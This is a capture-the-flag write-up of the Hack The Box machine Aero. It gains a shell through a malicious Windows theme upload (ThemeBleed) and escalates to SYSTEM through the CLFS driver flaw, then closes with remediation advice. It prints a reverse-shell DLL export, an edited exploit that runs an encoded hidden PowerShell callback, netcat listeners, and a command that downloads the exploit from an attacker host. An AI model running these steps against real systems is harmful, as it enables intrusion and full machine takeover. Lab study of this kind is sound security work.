---
title: "Aero — ThemeBleed and CLFS Privilege Escalation"
description: "A malicious Windows theme upload on the ThemeBleed path yields a shell, then CLFS abuse escalates to SYSTEM."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - cve-2023-38146
  - cve-2023-28252
  - themebleed
  - privilege-escalation
objective: "Gain a foothold by abusing a Windows theme-file upload, then escalate from a standard user to SYSTEM through the Common Log File System driver."
tools:
  - rustscan
  - ThemeBleed
  - python3
  - netcat
skill: "Windows theme-file exploitation and CLFS local privilege escalation"
outcome: "User-level shell via the ThemeBleed theme upload, then SYSTEM command execution via the CLFS driver vulnerability."
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Windows 11; Microsoft IIS 10.0 |
| Starting position | Unauthenticated network access |
| Objective | Gain a foothold by abusing a Windows theme-file upload, then escalate from a standard user to SYSTEM through the Common Log File System driver |
| Outcome | User-level shell via the ThemeBleed theme upload; SYSTEM command execution via the CLFS driver vulnerability |

## ThemeBleed upload and CLFS escalation

Aero is a Medium-rated Hack The Box Windows machine built around two public vulnerabilities. Initial access abuses CVE-2023-38146 (ThemeBleed) by uploading a malicious Windows theme that causes the host to load an attacker-controlled DLL, which returns a shell as `<LAB_USER>`. Privilege escalation then applies CVE-2023-28252, a Windows Common Log File System (CLFS) driver flaw, to reach `NT AUTHORITY\SYSTEM`. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Malicious theme upload → ThemeBleed DLL load → shell as `<LAB_USER>` → local enumeration → CLFS driver abuse → `NT AUTHORITY\SYSTEM`**

## Theme portal, Windows 11 target, and no credentials

- **Target:** a Windows 11 host exposing a single web service, Microsoft IIS 10.0 on port 80.
- **Application:** a Windows theme-sharing portal with a theme-file upload feature.
- **Starting position:** unauthenticated network access, with no credentials provided.
- **Objective:** gain a foothold through the theme-processing workflow, then escalate local privileges to SYSTEM.
- **Constraints:** all activity stayed inside the Hack The Box lab environment.

## Evidence: theme upload to CLFS SYSTEM execution

### 1. Service Enumeration

Observation: a full TCP scan exposes a single network service.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/Aero-TCP
```

```text
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: Aero Theme Hub
```

Significance: HTTP is the entire external attack surface, and the portal accepts Windows theme files. Theme processing is the path here, not a conventional web flaw, and it maps to CVE-2023-38146.

Result: HTTP on port 80 (Microsoft IIS 10.0) is the only exposed service.

### 2. ThemeBleed Initial Access (CVE-2023-38146)

Observation: the upload feature accepts Windows theme files, and CVE-2023-38146 lets a crafted theme reference attacker-controlled content that the host loads while processing the theme.

Action: build a payload DLL exporting `VerifyThemeVersion`, the callback the public proof of concept invokes; stage it under the filename the PoC serves (`ren <PAYLOAD_DLL> <STAGE_FILENAME>`); generate a malicious theme; and start the PoC server alongside a listener.

```cpp
extern "C" __declspec(dllexport) int VerifyThemeVersion(void)
{
    rev_shell();
    return 0;
}
```

```powershell
.\ThemeBleed.exe make_theme <ATTACKER_HOST> aero.theme
.\ThemeBleed.exe server
```

```powershell
.\nc64.exe -lvnp <CALLBACK_PORT>
```

Uploading the generated theme triggers three staged requests and the DLL callback:

```text
Client requested stage 1 - Version check
Client requested stage 2 - Verify signature
Client requested stage 3 - LoadLibrary

connect to <ATTACKER_HOST> from (UNKNOWN) [<TARGET_IP>]
C:\Windows\system32>whoami
<LAB_USER>
```

Significance: processing a user-supplied theme loads attacker-controlled code, so a file upload becomes remote code execution, and the staged-request sequence shows the DLL loaded through the expected theme callback.

Result: the callback returns a reverse shell as `<LAB_USER>`.

### 3. Local Enumeration

Observation: after the foothold, I checked the user profile for files of interest.

```powershell
Get-ChildItem "$env:USERPROFILE" -Recurse -File -Exclude desktop.ini
```

The recorded search identified a file named `CVE-2023-28252_Summary.pdf` in the user's Documents folder; no directory-listing output was captured, so I could not verify this from a shown result and report it from the recorded session. The filename is the intended privilege-escalation hint and points directly at CVE-2023-28252.

Significance: a vulnerability note sitting in a user-writable profile pointed straight at the local flaw to exploit next; in lab and CTF environments, patch notes, filenames, and metadata can disclose which weaknesses remain.

Result: the user's profile contains a hint identifying the CLFS driver vulnerability.

### 4. CLFS Privilege Escalation (CVE-2023-28252)

Observation: CVE-2023-28252 affects the Windows Common Log File System driver, and its exploitation is local, which fits the existing low-privileged shell.

Action: modify a working proof of concept so its SYSTEM branch launches a callback instead of a benign process, build it as x64 Release, host it, download it to the target, and execute it with a listener running.

```cpp
if (strcmp(username, "SYSTEM") == 0) {
    system("powershell -nop -w hidden -e <BASE64_SHELL>");
}
```

```bash
python3 -m http.server <HTTP_PORT>
```

```powershell
iwr http://<ATTACKER_HOST>:<HTTP_PORT>/clfs_eop.exe -OutFile clfs_eop.exe
.\nc64.exe -lvnp <CALLBACK_PORT>
.\clfs_eop.exe
```

Executing the exploit captures the SYSTEM token and fires the payload:

```text
ACTUAL USER=SYSTEM

PS C:\Users\<LAB_USER>\Documents> whoami
nt authority\system
```

Significance: the CLFS driver flaw is the privilege boundary crossed here; the exploit crosses it to run the callback in the SYSTEM context.

Result: the `whoami` output confirms execution as `nt authority\system`.

## Modifying the CLFS proof of concept to callback

The recorded work contains no failed attempts, blocked steps, or troubleshooting. The one documented adaptation is described in Stage 4: modifying a working CVE-2023-28252 proof of concept so its SYSTEM branch launches the callback instead of a benign process. No other decisions were recorded.

## Outcome: user shell and SYSTEM execution

The evidence establishes authenticated code execution as `<LAB_USER>` through the theme-processing flaw and, after local privilege escalation, command execution as `NT AUTHORITY\SYSTEM`, with the SYSTEM identity confirmed by `whoami`. Limitations: the exploit payload is summarized and not reproduced, and both intended flag captures are omitted.

## Recommendations: theme uploads, the CLFS driver, and profile notes

Each finding pairs the observed root cause with its demonstrated impact and a prioritized action. The actions are recommendations; none was validated in the lab.

1. **Theme-file processing reaches code execution (CVE-2023-38146).** Root cause: the portal accepts `.theme` uploads that the host processes, so a crafted theme can load attacker-referenced content. Impact: an uploaded theme became remote code execution as `<LAB_USER>`. *Recommendation:* apply the CVE-2023-38146 fix and treat theme files as untrusted input; reject or sandbox them instead of letting the host process them. *Detection:* detect theme-file uploads and on DLL loads originating from user-writable or download directories.
2. **Unpatched kernel-mode driver (CVE-2023-28252).** Root cause: the Common Log File System driver carried a local elevation-of-privilege flaw. Impact: a standard user reached SYSTEM code execution. *Recommendation:* apply the Windows cumulative updates that contain the CLFS fix and keep driver-level patches within the normal update cycle. *Detection:* monitor for CLFS log-file manipulation and for unexpected SYSTEM-context child processes.
3. **Vulnerability notes left in a user-accessible location.** Root cause: a PDF named for the elevation CVE sat in the user's profile. Impact: the filename indicated which local flaw to exploit next. *Recommendation:* keep patch and vulnerability notes out of end-user profile directories and accessible shares. *Detection:* include user profile directories in reviews for sensitive security or patch documentation.

## References

- [Hack The Box — Aero](https://app.hackthebox.com/machines/Aero) (retired machine)
- [NVD — CVE-2023-38146](https://nvd.nist.gov/vuln/detail/CVE-2023-38146) (Windows theme remote code execution, "ThemeBleed")
- [NVD — CVE-2023-28252](https://nvd.nist.gov/vuln/detail/CVE-2023-28252) (Windows Common Log File System driver elevation of privilege)
- [Microsoft Security Response Center — CVE-2023-38146](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-38146) (vendor advisory and update guidance)
- [Microsoft Security Response Center — CVE-2023-28252](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-28252) (vendor advisory and update guidance)
- [Gabe Kirkpatrick — CVE-2023-38146: Arbitrary Code Execution via Windows Themes](https://exploits.forsale/themebleed/) (original ThemeBleed disclosure and proof of concept)
- [ThemeBleed proof of concept (exploits-forsale)](https://github.com/exploits-forsale/themebleed) (public PoC used here)
- [Microsoft Learn — Introduction to the Common Log File System](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/introduction-to-the-common-log-file-system) (CLFS driver documentation)
- [RustScan](https://github.com/RustScan/RustScan) (fast port scanner)
- [netcat for Windows (`nc64.exe`)](https://eternallybored.org/misc/netcat/) (Windows netcat distribution)
